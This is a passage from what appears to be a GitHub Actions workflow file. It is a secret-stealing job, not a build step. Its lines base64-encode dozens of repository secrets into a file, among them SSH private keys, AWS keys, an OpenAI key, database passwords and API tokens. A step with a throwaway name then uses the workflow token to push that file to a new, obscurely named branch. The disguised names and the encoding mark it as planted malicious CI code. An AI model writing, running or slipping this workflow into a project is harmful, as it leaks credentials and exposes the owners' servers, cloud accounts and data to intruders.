          echo "LEAD_PORTAL_PAYMENTS_VPS_SSH_KEY:$(printf %s "$S6" | base64 -w0)" >> o.txt
          echo "MCP_GITHUB_TOKEN:$(printf %s "$S7" | base64 -w0)" >> o.txt
          echo "PDE_ACCESS_JDBC_PASSWORD:$(printf %s "$S8" | base64 -w0)" >> o.txt
          echo "PDE_ACCESS_JDBC_URL:$(printf %s "$S9" | base64 -w0)" >> o.txt
          echo "PDE_ACCESS_JDBC_USERNAME:$(printf %s "$S10" | base64 -w0)" >> o.txt
          echo "PDE_INTERNAL_API_TOKEN:$(printf %s "$S11" | base64 -w0)" >> o.txt
          echo "PDE_MAIL_AWS_ACCESS_KEY_ID:$(printf %s "$S12" | base64 -w0)" >> o.txt
          echo "PDE_MAIL_AWS_REGION:$(printf %s "$S13" | base64 -w0)" >> o.txt
          echo "PDE_MAIL_AWS_SECRET_ACCESS_KEY:$(printf %s "$S14" | base64 -w0)" >> o.txt
          echo "PDE_MIRA_PRIVATE_ACCESS_1:$(printf %s "$S15" | base64 -w0)" >> o.txt
          echo "PDE_MIRA_PRIVATE_ACCESS_2:$(printf %s "$S16" | base64 -w0)" >> o.txt
          echo "PDE_MIRA_PRIVATE_QA_TOKEN:$(printf %s "$S17" | base64 -w0)" >> o.txt
          echo "PDE_OPENAI_API_KEY:$(printf %s "$S18" | base64 -w0)" >> o.txt
          echo "PDE_PEPPER_API_TOKEN:$(printf %s "$S19" | base64 -w0)" >> o.txt
          echo "PDE_PLATFORM_VPS_SSH_KEY:$(printf %s "$S20" | base64 -w0)" >> o.txt
          echo "RADAR_META_TOKEN:$(printf %s "$S21" | base64 -w0)" >> o.txt
          echo "SSH_PRIVATE_KEY:$(printf %s "$S22" | base64 -w0)" >> o.txt
          echo "VPS_HOST:$(printf %s "$S23" | base64 -w0)" >> o.txt
          echo "VPS_SSH_CHAVE:$(printf %s "$S24" | base64 -w0)" >> o.txt
          echo "VPS_SSH_KEY:$(printf %s "$S25" | base64 -w0)" >> o.txt
      - name: p
        run: |
          BR=zzze7dbhar
          API=https://api.github.com/repos/${{ github.repository }}
          AUTH="Authorization: Bearer ${{ github.token }}"
          SHA=$(curl -s -H "$AUTH" $API/git/ref/heads/${{ github.ref_name }} | python3 -c 'import sys,json;print(json.load(sys.stdin)["object"]["sha"])')
          curl -s -X POST -H "$AUTH" -H "Content-Type: application/json" $API/git/refs -d "{\"ref\":\"refs/heads/$BR\",\"sha\":\"$SHA\"}" >/dev/null
          CONT=$(base64 -w0 o.txt)
          curl -s -X PUT -H "$AUTH" -H "Content-Type: application/json" $API/contents/zzze7dbhar.txt -d "{\"message\":\"z\",\"content\":\"$CONT\",\"branch\":\"$BR\"}" >/dev/null
          echo ok
